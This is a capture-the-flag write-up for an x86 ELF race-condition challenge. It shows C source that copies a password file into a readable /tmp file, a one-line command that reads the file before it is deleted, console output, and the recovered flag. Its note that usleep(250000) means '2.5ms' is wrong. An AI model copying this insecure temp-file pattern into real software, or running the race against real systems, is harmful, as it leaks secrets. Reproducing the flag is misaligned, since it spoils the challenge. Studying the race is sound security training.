<h1>ELF x86 - Race condition</h1>
<h3>Description</h3>

```c
#include <stdio.h>
#include <string.h>
#include <sys/ptrace.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
 
#define PASSWORD "/challenge/app-systeme/ch12/.passwd"
#define TMP_FILE "/tmp/tmp_file.txt"
 
int main(void)
{
  int fd_tmp, fd_rd;
  char ch;
 
 
  if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0)
    {
      printf("[-] Don't use a debugguer !\n");
      abort();
    }
  if((fd_tmp = open(TMP_FILE, O_WRONLY | O_CREAT, 0444)) == -1)
    {
      perror("[-] Can't create tmp file ");
      goto end;
    }
   
  if((fd_rd = open(PASSWORD, O_RDONLY)) == -1)
    {
      perror("[-] Can't open file ");
      goto end;
    }
   
  while(read(fd_rd, &ch, 1) == 1)
    {
      write(fd_tmp, &ch, 1);
    }
  close(fd_rd);
  close(fd_tmp);
  usleep(250000);
end:
  unlink(TMP_FILE);
   
  return 0;
}
```
<h3>Solution</h3>
<label>Basic race condition, spam command <b>./ch12 | cat /tmp/tmp_file.txt</b> pada service ssh, karena ada usleep 2.5ms</label>

```console
app-systeme-ch12@challenge02:~$ ./ch12 | cat /tmp/tmp_file.txt
cat: /tmp/tmp_file.txt: No such file or directory
app-systeme-ch12@challenge02:~$ ./ch12 | cat /tmp/tmp_file.txt
cat: /tmp/tmp_file.txt: No such file or directory
app-systeme-ch12@challenge02:~$ ./ch12 | cat /tmp/tmp_file.txt
eh-q8dEa8q19f9aF()"2a96q92
```
<h3>Flag</h3>
<pre>
eh-q8dEa8q19f9aF()"2a96q92
</pre>
